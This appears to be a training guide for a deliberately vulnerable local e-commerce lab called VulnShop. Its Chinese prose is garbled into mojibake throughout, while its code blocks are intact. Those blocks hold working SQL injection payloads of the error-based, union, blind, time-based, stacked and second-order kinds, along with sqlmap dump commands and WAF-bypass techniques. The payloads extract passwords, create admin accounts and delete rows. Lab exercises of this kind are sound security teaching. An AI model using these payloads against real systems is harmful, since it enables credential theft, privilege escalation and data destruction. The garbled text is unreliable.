# æµ‹è¯•æ–¹æ³•ä¸åˆ©ç”¨ç¤ºä¾‹

<cite>
**æœ¬æ–‡æ¡£å¼•ç”¨æ–‡ä»¶**   
- [server.py](file://src/vulnTestServer/server.py)
- [waf.py](file://src/vulnTestServer/waf.py)
- [database.py](file://src/vulnTestServer/database.py)
- [config.py](file://src/vulnTestServer/config.py)
- [USAGE.md](file://src/vulnTestServer/doc/USAGE.md)
- [README.md](file://src/vulnTestServer/README.md)
- [test_sqli.py](file://src/vulnTestServer/test_sqli.py)
- [sqlmap.py](file://src/backEnd/third_lib/sqlmap/sqlmap.py)
- [randomcase.py](file://src/backEnd/third_lib/sqlmap/tamper/randomcase.py)
- [space2comment.py](file://src/backEnd/third_lib/sqlmap/tamper/space2comment.py)
- [base64encode.py](file://src/backEnd/third_lib/sqlmap/tamper/base64encode.py)
- [uppercase.py](file://src/backEnd/third_lib/sqlmap/tamper/uppercase.py)
</cite>

## ç›®å½•
1. [å¼•è¨€](#å¼•è¨€)
2. [VulnShopé¶åœºç¯å¢ƒæ­å»º](#vulnshopé¶åœºç¯å¢ƒæ­å»º)
3. [æ¼æ´ç±»å‹æµ‹è¯•æŒ‡å—](#æ¼æ´ç±»å‹æµ‹è¯•æŒ‡å—)
4. [sqlmapè‡ªåŠ¨åŒ–æµ‹è¯•æ–¹æ³•](#sqlmapè‡ªåŠ¨åŒ–æµ‹è¯•æ–¹æ³•)
5. [WAFç»•è¿‡æŠ€æœ¯å®è·µ](#wafç»•è¿‡æŠ€æœ¯å®è·µ)
6. [å®Œæ•´æµ‹è¯•ç”¨ä¾‹é›†](#å®Œæ•´æµ‹è¯•ç”¨ä¾‹é›†)
7. [æ•°æ®æå–ä¸æƒé™æå‡](#æ•°æ®æå–ä¸æƒé™æå‡)
8. [æœ€ä½³æµ‹è¯•å®è·µ](#æœ€ä½³æµ‹è¯•å®è·µ)
9. [é™„å½•](#é™„å½•)

## å¼•è¨€

æœ¬æ–‡æ¡£æ—¨åœ¨ä¸ºå®‰å…¨ç ”ç©¶äººå‘˜æä¾›é’ˆå¯¹VulnShopé¶åœºçš„å…¨é¢æµ‹è¯•æ–¹æ³•ä¸åˆ©ç”¨ç¤ºä¾‹ã€‚VulnShopæ˜¯ä¸€ä¸ªä¸“é—¨è®¾è®¡ç”¨äºSQLæ³¨å…¥æµ‹è¯•å’Œå­¦ä¹ çš„æ¼æ´é¶åœºï¼Œæ¨¡æ‹Ÿäº†ä¸€ä¸ªå®Œæ•´çš„ç”µå•†å¹³å°ï¼ŒåŒ…å«äº†å¤šç§ç±»å‹çš„SQLæ³¨å…¥æ¼æ´ã€‚æœ¬æ–‡æ¡£å°†è¯¦ç»†ä»‹ç»é’ˆå¯¹ä¸åŒæ¼æ´ç±»å‹çš„æµ‹è¯•æ­¥éª¤ã€æ‰‹å·¥æµ‹è¯•ä¸è‡ªåŠ¨åŒ–å·¥å…·ï¼ˆå¦‚sqlmapï¼‰çš„ä½¿ç”¨æŠ€å·§ï¼Œå¹¶æä¾›å…·ä½“çš„POCï¼ˆæ¦‚å¿µéªŒè¯ï¼‰ç¤ºä¾‹ã€‚

é€šè¿‡æœ¬æŒ‡å—ï¼Œç”¨æˆ·å°†èƒ½å¤ŸæŒæ¡å¦‚ä½•æ„é€ HTTPè¯·æ±‚ã€è®¾è®¡payloadã€åˆ©ç”¨sqlmapå·¥å…·è¿›è¡Œæ‰«æå’Œåˆ©ç”¨ï¼Œä»¥åŠåº”ç”¨WAFç»•è¿‡æŠ€æœ¯ã€‚æ­¤å¤–ï¼Œæ–‡æ¡£è¿˜æ¶µç›–äº†å®Œæ•´çš„æµ‹è¯•ç”¨ä¾‹é›†ã€æ•°æ®æå–æ–¹æ³•å’Œæƒé™æå‡æŠ€å·§ï¼Œæœ€åæ€»ç»“äº†æœ€ä½³æµ‹è¯•å®è·µå’Œå®‰å…¨è¯„ä¼°æ–¹æ³•ã€‚

## VulnShopé¶åœºç¯å¢ƒæ­å»º

### å¯åŠ¨æœåŠ¡

VulnShopé¶åœºçš„å¯åŠ¨éå¸¸ç®€å•ï¼Œåªéœ€æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```bash
cd src/vulnTestServer
python server.py
```

æœåŠ¡å°†åœ¨ `http://127.0.0.1:9527` å¯åŠ¨ã€‚å¯åŠ¨æˆåŠŸåï¼Œç»ˆç«¯ä¼šæ˜¾ç¤ºASCIIè‰ºæœ¯å­—å’Œé…ç½®ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç‰ˆæœ¬å·ã€éš¾åº¦çº§åˆ«å’ŒæœåŠ¡å™¨åœ°å€ã€‚

### è®¿é—®é¶åœº

1. æ‰“å¼€æµè§ˆå™¨è®¿é—® `http://127.0.0.1:9527`
2. ä½¿ç”¨æµ‹è¯•è´¦æˆ·ç™»å½•

### æµ‹è¯•è´¦æˆ·

| ç”¨æˆ·å | å¯†ç  | è§’è‰² |
|--------|------|------|
| admin | admin123 | ç®¡ç†å‘˜ |
| test | test | æ™®é€šç”¨æˆ· |
| alice | alice123 | æ™®é€šç”¨æˆ· |
| bob | bob456 | æ™®é€šç”¨æˆ· |

### éš¾åº¦é…ç½®

VulnShopæä¾›äº†ä¸‰ç§éš¾åº¦çº§åˆ«ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼åˆ‡æ¢ï¼š

1. **Webç•Œé¢**: è®¿é—®ã€Œç³»ç»Ÿé…ç½®ã€é¡µé¢
2. **API**: å‘é€ `POST /api/config` è¯·æ±‚ï¼Œæºå¸¦ `{"difficulty": "medium"}`
3. **é…ç½®æ–‡ä»¶**: ç¼–è¾‘ `config.py` ä¸­çš„ `DIFFICULTY` å˜é‡

**Section sources**
- [server.py](file://src/vulnTestServer/server.py#L1-L50)
- [config.py](file://src/vulnTestServer/config.py#L1-L20)
- [README.md](file://src/vulnTestServer/README.md#L1-L100)

## æ¼æ´ç±»å‹æµ‹è¯•æŒ‡å—

### 1. åŸºäºé”™è¯¯çš„SQLæ³¨å…¥ (Error-based)

**ç›®æ ‡æ¥å£**: `POST /api/user/login`

**åŸç†**: é€šè¿‡æ„é€ é”™è¯¯çš„SQLè¯­å¥ï¼Œåˆ©ç”¨æ•°æ®åº“è¿”å›çš„é”™è¯¯ä¿¡æ¯è·å–æ•°æ®ã€‚

**æµ‹è¯•æ­¥éª¤**:
1. è®¿é—®ç™»å½•é¡µé¢
2. åœ¨ç”¨æˆ·åè¾“å…¥æ¡†ä¸­è¾“å…¥payload
3. è§‚å¯Ÿè¿”å›çš„é”™è¯¯ä¿¡æ¯

**æµ‹è¯•Payload**:
```sql
# æ£€æµ‹æ³¨å…¥
admin'

# æå–æ•°æ®åº“ç‰ˆæœ¬
admin' AND 1=CAST((SELECT sqlite_version()) AS int)--

# æå–è¡¨å
admin' AND 1=CAST((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) AS int)--

# æå–ç”¨æˆ·å¯†ç 
admin' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS int)--
```

**ä½¿ç”¨curlæµ‹è¯•**:
```bash
curl -X POST http://127.0.0.1:9527/api/user/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''","password":"x"}'
```

**Section sources**
- [server.py](file://src/vulnTestServer/server.py#L100-L150)
- [USAGE.md](file://src/vulnTestServer/doc/USAGE.md#L100-L137)

### 2. è”åˆæŸ¥è¯¢SQLæ³¨å…¥ (Union-based)

**ç›®æ ‡æ¥å£**: `GET /api/user/profile?id=`

**åŸç†**: åˆ©ç”¨UNIONè¯­å¥å°†é¢å¤–çš„æŸ¥è¯¢ç»“æœé™„åŠ åˆ°åŸæŸ¥è¯¢ç»“æœä¸­ã€‚

**æµ‹è¯•æ­¥éª¤**:
1. é¦–å…ˆç¡®å®šåˆ—æ•°
2. ä½¿ç”¨UNIONæ³¨å…¥æå–å…¶ä»–è¡¨çš„æ•°æ®

**æµ‹è¯•Payload**:
```sql
# ç¡®å®šåˆ—æ•°ï¼ˆå›æ˜¾æ­£å¸¸è¡¨ç¤ºåˆ—æ•°æ­£ç¡®ï¼‰
1 ORDER BY 6--
1 ORDER BY 7--  # å¦‚æœæŠ¥é”™ï¼Œè¯´æ˜åªæœ‰6åˆ—

# ç¡®å®šå›æ˜¾ä½ç½®
-1 UNION SELECT 1,2,3,4,5,6--

# æå–secretsè¡¨ä¸­çš„flag
-1 UNION SELECT 1,flag,description,4,5,6 FROM secrets--

# æå–æ‰€æœ‰ç”¨æˆ·å¯†ç 
-1 UNION SELECT 1,username,password,email,phone,address FROM users--
```

**ä½¿ç”¨curlæµ‹è¯•**:
```bash
curl "http://127.0.0.1:9527/api/user/profile?id=-1%20UNION%20SELECT%201,flag,description,4,5,6%20FROM%20secrets--"
```

**Section sources**
- [server.py](file://src/vulnTestServer/server.py#L150-L200)
- [USAGE.md](file://src/vulnTestServer/doc/USAGE.md#L138-L172)

### 3. å¸ƒå°”ç›²æ³¨ (Boolean-blind)

**ç›®æ ‡æ¥å£**: `GET /api/products/search?keyword=`

**åŸç†**: é€šè¿‡è§‚å¯Ÿå“åº”å·®å¼‚ï¼ˆæœ‰ç»“æœ/æ— ç»“æœï¼‰æ¥é€ä½çŒœæµ‹æ•°æ®ã€‚

**æµ‹è¯•æ­¥éª¤**:
1. æ„é€ æ¡ä»¶è¯­å¥
2. æ ¹æ®è¿”å›ç»“æœåˆ¤æ–­æ¡ä»¶æ˜¯å¦ä¸ºçœŸ
3. é€å­—ç¬¦çŒœæµ‹ç›®æ ‡æ•°æ®

**æµ‹è¯•Payload**:
```sql
# æ£€æµ‹æ³¨å…¥ï¼ˆè¿”å›æœ‰ç»“æœ = æ¡ä»¶ä¸ºçœŸï¼‰
test' AND 1=1--
test' AND 1=2--  # æ— ç»“æœ

# çŒœæµ‹adminå¯†ç ç¬¬ä¸€ä¸ªå­—ç¬¦
test' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='0'--
test' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='1'--
# ... ç»§ç»­å°è¯•ç›´åˆ°æœ‰ç»“æœ

# ä½¿ç”¨ASCIIç æ¯”è¾ƒ
test' AND (SELECT unicode(SUBSTR(password,1,1)) FROM users WHERE username='admin')>96--
```

**Section sources**
- [server.py](file://src/vulnTestServer/server.py#L200-L250)
- [USAGE.md](file://src/vulnTestServer/doc/USAGE.md#L173-L203)

### 4. æ—¶é—´ç›²æ³¨ (Time-based)

**ç›®æ ‡æ¥å£**: `GET /api/products/detail?id=`

**åŸç†**: é€šè¿‡å“åº”æ—¶é—´çš„å·®å¼‚æ¥åˆ¤æ–­æ¡ä»¶æ˜¯å¦ä¸ºçœŸã€‚

**æ³¨æ„**: SQLiteæ²¡æœ‰SLEEPå‡½æ•°ï¼Œä½¿ç”¨randomblob()äº§ç”Ÿå»¶è¿Ÿã€‚

**æµ‹è¯•Payload**:
```sql
# æ£€æµ‹æ³¨å…¥ï¼ˆæ¡ä»¶ä¸ºçœŸæ—¶äº§ç”Ÿå»¶è¿Ÿï¼‰
1 AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)
1 AND (SELECT CASE WHEN (1=2) THEN randomblob(100000000) ELSE 1 END)  # æ— å»¶è¿Ÿ

# çŒœæµ‹adminå¯†ç ç¬¬ä¸€ä¸ªå­—ç¬¦
1 AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='0') THEN randomblob(100000000) ELSE 1 END)
```

**ä½¿ç”¨curlæµ‹è¯•ï¼ˆè§‚å¯Ÿå“åº”æ—¶é—´ï¼‰**:
```bash
time curl "http://127.0.0.1:9527/api/products/detail?id=1%20AND%20(SELECT%20CASE%20WHEN%20(1=1)%20THEN%20randomblob(100000000)%20ELSE%201%20END)"
```

**Section sources**
- [server.py](file://src/vulnTestServer/server.py#L250-L300)
- [USAGE.md](file://src/vulnTestServer/doc/USAGE.md#L204-L230)

### 5. å †å æŸ¥è¯¢æ³¨å…¥ (Stacked Queries)

**ç›®æ ‡æ¥å£**: `GET /api/orders/query?order_no=`

**åŸç†**: åœ¨åŸæŸ¥è¯¢åé¢æ·»åŠ æ–°çš„SQLè¯­å¥æ‰§è¡Œã€‚

**æµ‹è¯•Payload**:
```sql
# æ’å…¥æ–°ç”¨æˆ·
ORD20231201001'; INSERT INTO users(username,password,email,is_admin) VALUES('hacker','5f4dcc3b5aa765d61d8327deb882cf99','hacker@test.com',1);--

# æ›´æ–°æ•°æ®
ORD20231201001'; UPDATE users SET is_admin=1 WHERE username='test';--

# åˆ é™¤æ•°æ®ï¼ˆè°¨æ…ä½¿ç”¨ï¼‰
ORD20231201001'; DELETE FROM orders WHERE id>10;--
```

**Section sources**
- [server.py](file://src/vulnTestServer/server.py#L300-L350)
- [USAGE.md](file://src/vulnTestServer/doc/USAGE.md#L231-L251)

### 6. äºŒæ¬¡æ³¨å…¥ (Second-order)

**ç›®æ ‡æ¥å£**: `POST /api/user/register`

**åŸç†**: æ¶æ„æ•°æ®å…ˆè¢«å­˜å‚¨ï¼Œç„¶ååœ¨å¦ä¸€ä¸ªä½ç½®è¢«ä½¿ç”¨æ—¶è§¦å‘æ³¨å…¥ã€‚

**æµ‹è¯•æ­¥éª¤**:
1. æ³¨å†Œä¸€ä¸ªåŒ…å«SQLæ³¨å…¥payloadçš„ç”¨æˆ·å
2. ç³»ç»Ÿåœ¨åç»­æ“ä½œä¸­ä½¿ç”¨è¯¥ç”¨æˆ·åæ—¶è§¦å‘æ³¨å…¥

**æµ‹è¯•Payload**:
```sql
# æ³¨å†Œç”¨æˆ·åä¸º: admin'--
# å½“ç³»ç»ŸæŸ¥è¯¢è¯¥ç”¨æˆ·åæ—¶ï¼Œå¯èƒ½æ‰§è¡Œ: WHERE username = 'admin'--'
# å¯¼è‡´æ³¨é‡Šæ‰åé¢çš„æ¡ä»¶

# æ³¨å†Œæ—¶
{"username": "admin'--", "password": "test123", "email": "test@test.com"}
```

**Section sources**
- [server.py](file://src/vulnTestServer/server.py#L350-L400)
- [USAGE.md](file://src/vulnTestServer/doc/USAGE.md#L252-L274)

## sqlmapè‡ªåŠ¨åŒ–æµ‹è¯•æ–¹æ³•

### æµ‹è¯•ç™»å½•æ¥å£ï¼ˆError-basedï¼‰

```bash
sqlmap -u "http://127.0.0.1:9527/api/user/login" \
  --method=POST \
  --data='{"username":"*","password":"test"}' \
  --headers="Content-Type: application/json" \
  --dbms=sqlite \
  --batch
```

### æµ‹è¯•ç”¨æˆ·èµ„æ–™æ¥å£ï¼ˆUnion-basedï¼‰

```bash
sqlmap -u "http://127.0.0.1:9527/api/user/profile?id=1" \
  --dbms=sqlite \
  --batch \
  --dump
```

### æµ‹è¯•å•†å“æœç´¢æ¥å£ï¼ˆBoolean-based Blindï¼‰

```bash
sqlmap -u "http://127.0.0.1:9527/api/products/search?keyword=test" \
  --dbms=sqlite \
  --technique=B \
  --batch \
  --dump
```

### æµ‹è¯•å•†å“è¯¦æƒ…æ¥å£ï¼ˆTime-based Blindï¼‰

```bash
sqlmap -u "http://127.0.0.1:9527/api/products/detail?id=1" \
  --dbms=sqlite \
  --technique=T \
  --batch \
  --dump
```

### å¸¸ç”¨sqlmapå‚æ•°

```bash
--dbms=sqlite       # æŒ‡å®šæ•°æ®åº“ç±»å‹
--batch             # è‡ªåŠ¨ç¡®è®¤
--dump              # å¯¼å‡ºæ•°æ®
--tables            # åˆ—å‡ºè¡¨å
--columns -T users  # åˆ—å‡ºusersè¡¨çš„åˆ—
-D database -T table -C column --dump  # å¯¼å‡ºæŒ‡å®šæ•°æ®
--level=5           # æµ‹è¯•ç­‰çº§
--risk=3            # é£é™©ç­‰çº§
```

**Section sources**
- [sqlmap.py](file://src/backEnd/third_lib/sqlmap/sqlmap.py#L1-L100)
- [USAGE.md](file://src/vulnTestServer/doc/USAGE.md#L277-L331)

## WAFç»•è¿‡æŠ€æœ¯å®è·µ

### Easyæ¨¡å¼

- æ— ä»»ä½•é˜²æŠ¤
- æ‰€æœ‰æ³¨å…¥ç±»å‹å¯ç”¨
- è¿”å›è¯¦ç»†é”™è¯¯ä¿¡æ¯

### Mediumæ¨¡å¼

- ç®€å•å…³é”®å­—è¿‡æ»¤
- å¯é€šè¿‡å¤§å°å†™ç»•è¿‡: `UnIoN SeLeCt`
- å¯é€šè¿‡ç¼–ç ç»•è¿‡

**ç»•è¿‡æ–¹æ³•**:
```sql
# å¤§å°å†™æ··ç”¨
-1 UnIoN SeLeCt 1,2,3,4,5,6--

# åŒå†™ç»•è¿‡
-1 UNunionION SEselectLECT 1,2,3,4,5,6--
```

### Hardæ¨¡å¼

- ä¸¥æ ¼å…³é”®å­—è¿‡æ»¤
- é•¿åº¦é™åˆ¶
- ç¦æ­¢å¸¸è§ç»•è¿‡æŠ€æœ¯

**éœ€è¦çš„æŠ€æœ¯**:
- é«˜çº§ç¼–ç ç»•è¿‡
- å†…è”æ³¨é‡Š
- ç­‰ä»·å‡½æ•°æ›¿æ¢

**sqlmapç»•è¿‡è„šæœ¬**

VulnShopé›†æˆäº†sqlmapçš„å¤šç§ç»•è¿‡è„šæœ¬ï¼Œå¯ç”¨äºåº”å¯¹ä¸åŒçº§åˆ«çš„WAFé˜²æŠ¤ã€‚

#### å¤§å°å†™å˜æ¢ (randomcase.py)

```python
def tamper(payload, **kwargs):
    """
    å°†æ¯ä¸ªå…³é”®å­—å­—ç¬¦æ›¿æ¢ä¸ºéšæœºå¤§å°å†™å€¼ï¼ˆä¾‹å¦‚ï¼šSELECT -> SEleCtï¼‰
    """
```

#### ç©ºæ ¼æ›¿æ¢ä¸ºæ³¨é‡Š (space2comment.py)

```python
def tamper(payload, **kwargs):
    """
    å°†ç©ºæ ¼å­—ç¬¦(' ')æ›¿æ¢ä¸ºæ³¨é‡Š'/**/'
    """
```

#### Base64ç¼–ç  (base64encode.py)

```python
def tamper(payload, **kwargs):
    """
    ä½¿ç”¨Base64å¯¹æ•´ä¸ªpayloadè¿›è¡Œç¼–ç 
    """
```

#### ç»Ÿä¸€è½¬ä¸ºå¤§å†™ (uppercase.py)

```python
def tamper(payload, **kwargs):
    """
    å°†æ¯ä¸ªå…³é”®å­—å­—ç¬¦æ›¿æ¢ä¸ºå¤§å†™å€¼ï¼ˆä¾‹å¦‚ï¼šselect -> SELECTï¼‰
    """
```

**Section sources**
- [waf.py](file://src/vulnTestServer/waf.py#L1-L121)
- [randomcase.py](file://src/backEnd/third_lib/sqlmap/tamper/randomcase.py#L1-L67)
- [space2comment.py](file://src/backEnd/third_lib/sqlmap/tamper/space2comment.py#L1-L59)
- [base64encode.py](file://src/backEnd/third_lib/sqlmap/tamper/base64encode.py#L1-L25)
- [uppercase.py](file://src/backEnd/third_lib/sqlmap/tamper/uppercase.py#L1-L47)

## å®Œæ•´æµ‹è¯•ç”¨ä¾‹é›†

### æ­£å¸¸è¯·æ±‚

| æ¥å£ | è¯·æ±‚æ–¹æ³• | å‚æ•° | é¢„æœŸç»“æœ |
|------|---------|------|---------|
| /api/user/login | POST | {"username": "admin", "password": "admin123"} | ç™»å½•æˆåŠŸ |
| /api/user/profile | GET | id=1 | è¿”å›ç”¨æˆ·ä¿¡æ¯ |
| /api/products/search | GET | keyword=iPhone | è¿”å›æœç´¢ç»“æœ |
| /api/products/detail | GET | id=1 | è¿”å›å•†å“è¯¦æƒ… |
| /api/orders/query | GET | order_no=ORD20231201001 | è¿”å›è®¢å•ä¿¡æ¯ |
| /api/user/register | POST | {"username": "test", "password": "test123", "email": "test@test.com"} | æ³¨å†ŒæˆåŠŸ |

### æ¶æ„è¯·æ±‚

| æ¥å£ | è¯·æ±‚æ–¹æ³• | Payload | é¢„æœŸç»“æœ |
|------|---------|--------|---------|
| /api/user/login | POST | {"username": "admin'--", "password": "x"} | ç»•è¿‡ç™»å½• |
| /api/user/profile | GET | id=1 UNION SELECT 1,flag,description,4,5,6 FROM secrets-- | æå–flag |
| /api/products/search | GET | keyword=test' AND 1=1-- | è¿”å›ç»“æœ |
| /api/products/search | GET | keyword=test' AND 1=2-- | æ— ç»“æœ |
| /api/products/detail | GET | id=1 AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END) | å»¶è¿Ÿå“åº” |
| /api/orders/query | GET | order_no=ORD20231201001'; INSERT INTO users(username,password,email) VALUES('hacker','pwned','h@h.com');-- | æ‰§è¡Œå¤šæ¡SQL |
| /api/user/register | POST | {"username": "admin'--", "password": "test", "email": "test@test.com"} | å­˜å‚¨æ¶æ„ç”¨æˆ·å |

### è¾¹ç•Œæµ‹è¯•

| æµ‹è¯•ç±»å‹ | æè¿° | é¢„æœŸç»“æœ |
|--------|------|---------|
| é•¿åº¦é™åˆ¶ | å‘é€è¶…é•¿payloadï¼ˆHardæ¨¡å¼ï¼‰ | WAFæ‹¦æˆª |
| ç‰¹æ®Šå­—ç¬¦ | åŒ…å«å„ç§ç‰¹æ®Šå­—ç¬¦çš„è¾“å…¥ | æ­£å¸¸å¤„ç†æˆ–WAFæ‹¦æˆª |
| ç¼–ç ç»•è¿‡ | ä½¿ç”¨URLç¼–ç ã€åŒé‡ç¼–ç ç­‰ | Mediumæ¨¡å¼ä¸‹å¯èƒ½ç»•è¿‡ |
| æ³¨é‡Šç¬¦å· | ä½¿ç”¨/* */ç­‰æ³¨é‡Šç¬¦å· | Hardæ¨¡å¼ä¸‹WAFæ‹¦æˆª |

**Section sources**
- [test_sqli.py](file://src/vulnTestServer/test_sqli.py#L1-L270)
- [USAGE.md](file://src/vulnTestServer/doc/USAGE.md#L369-L412)

## æ•°æ®æå–ä¸æƒé™æå‡

### æ•°æ®æå–æ–¹æ³•

1. **Error-based**: é€šè¿‡é”™è¯¯ä¿¡æ¯ç›´æ¥æå–æ•°æ®
2. **Union-based**: ä½¿ç”¨UNIONè¯­å¥æå–å…¶ä»–è¡¨çš„æ•°æ®
3. **Boolean-blind**: é€šè¿‡å¸ƒå°”å“åº”å·®å¼‚é€ä½çŒœæµ‹æ•°æ®
4. **Time-based**: é€šè¿‡å“åº”æ—¶é—´å·®å¼‚é€ä½çŒœæµ‹æ•°æ®

### æƒé™æå‡æŠ€å·§

1. **å †å æŸ¥è¯¢**: ä½¿ç”¨INSERTæˆ–UPDATEè¯­å¥æå‡æƒé™
   ```sql
   '; UPDATE users SET is_admin=1 WHERE username='test';--
   ```
2. **äºŒæ¬¡æ³¨å…¥**: æ³¨å†Œæ¶æ„ç”¨æˆ·åï¼Œç­‰å¾…ç³»ç»Ÿåœ¨æŸ¥è¯¢æ—¶è§¦å‘æ³¨å…¥
3. **åˆ©ç”¨å·²çŸ¥æ¼æ´**: ç»“åˆå¤šä¸ªæ¼æ´è¿›è¡Œæƒé™æå‡

**Section sources**
- [server.py](file://src/vulnTestServer/server.py#L400-L500)
- [database.py](file://src/vulnTestServer/database.py#L1-L50)

## æœ€ä½³æµ‹è¯•å®è·µ

1. **æˆæƒæµ‹è¯•**: ä»…åœ¨è·å¾—æ˜ç¡®æˆæƒçš„ç³»ç»Ÿä¸Šè¿›è¡Œæµ‹è¯•
2. **ç¯å¢ƒéš”ç¦»**: ä¸è¦åœ¨ç”Ÿäº§ç¯å¢ƒæˆ–é‡è¦ç³»ç»Ÿä¸Šè¿è¡Œ
3. **é€æ­¥æµ‹è¯•**: ä»ä½é£é™©çš„æµ‹è¯•æ–¹æ³•å¼€å§‹ï¼Œé€æ­¥å¢åŠ é£é™©
4. **è®°å½•ç»“æœ**: è¯¦ç»†è®°å½•æµ‹è¯•è¿‡ç¨‹å’Œç»“æœ
5. **åŠæ—¶å…³é—­**: ä¸ä½¿ç”¨æ—¶è¯·å…³é—­æœåŠ¡
6. **éµå®ˆæ³•å¾‹**: ä»…ç”¨äºæˆæƒçš„å®‰å…¨æµ‹è¯•å’Œå­¦ä¹ ç›®çš„

**Section sources**
- [README.md](file://src/vulnTestServer/README.md#L235-L242)
- [DISCLAIMER.md](file://src/vulnTestServer/doc/DISCLAIMER.md#L1-L50)

## é™„å½•

### å¸¸è§é—®é¢˜

**Q: æœåŠ¡æ— æ³•å¯åŠ¨ï¼Ÿ**
A: æ£€æŸ¥æ˜¯å¦æœ‰å…¶ä»–ç¨‹åºå ç”¨9527ç«¯å£ï¼Œæˆ–ä¿®æ”¹config.pyä¸­çš„PORTé…ç½®ã€‚

**Q: æç¤ºWAF Blockedï¼Ÿ**
A: å½“å‰éš¾åº¦è®¾ç½®ä¸ºmediumæˆ–hardï¼Œè¯·åˆ‡æ¢åˆ°easyæ¨¡å¼æˆ–ä½¿ç”¨ç»•è¿‡æŠ€æœ¯ã€‚

**Q: æ—¶é—´ç›²æ³¨æ²¡æœ‰å»¶è¿Ÿï¼Ÿ**
A: SQLiteçš„randomblobå¯èƒ½æ•ˆæœä¸æ˜æ˜¾ï¼Œå°è¯•å¢å¤§æ•°å€¼ï¼ˆå¦‚500000000ï¼‰ã€‚

**Q: å¦‚ä½•æ¸…é™¤æµ‹è¯•äº§ç”Ÿçš„æ•°æ®ï¼Ÿ**
A: è®¿é—®é…ç½®é¡µé¢ç‚¹å‡»"é‡ç½®æ•°æ®åº“"ï¼Œæˆ–è¿è¡Œ `python database.py`ã€‚

### éšè—Flag

ç³»ç»Ÿä¸­éšè—äº†å¤šä¸ªFlagï¼Œå°è¯•é€šè¿‡SQLæ³¨å…¥æ‰¾åˆ°å®ƒä»¬ï¼š
1. `FLAG{sql_injection_master}`
2. `FLAG{error_based_injection_success}`
3. `FLAG{union_based_extraction}`
4. `FLAG{blind_injection_expert}`
5. `FLAG{admin_password_leaked}`

ç¥ä½ æµ‹è¯•æ„‰å¿«ï¼ğŸ¯

**Section sources**
- [USAGE.md](file://src/vulnTestServer/doc/USAGE.md#L370-L412)
- [README.md](file://src/vulnTestServer/README.md#L243-L254)